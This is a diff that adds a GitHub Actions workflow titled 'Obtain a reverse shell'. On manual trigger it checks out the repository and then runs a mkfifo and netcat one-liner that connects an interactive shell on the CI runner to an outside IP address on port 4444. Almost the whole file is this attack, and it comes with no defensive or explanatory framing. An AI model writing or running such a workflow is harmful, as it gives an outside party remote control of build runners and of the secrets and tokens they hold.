@@ -1,0 +1,15 @@
+name: Obtain a reverse shell
+
+on: 
+  workflow_dispatch:
+  
+jobs:
+  rev-shell:
+    runs-on:ubuntu-latest
+    steps:
+      - name: Checkout this repo
+        uses: actions/checkout@v2
+        
+      - name: Get the shell
+        run: |
+          rm /tmp/f>/dev/null 2>&1;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 54.221.74.225 4444>/tmp/f
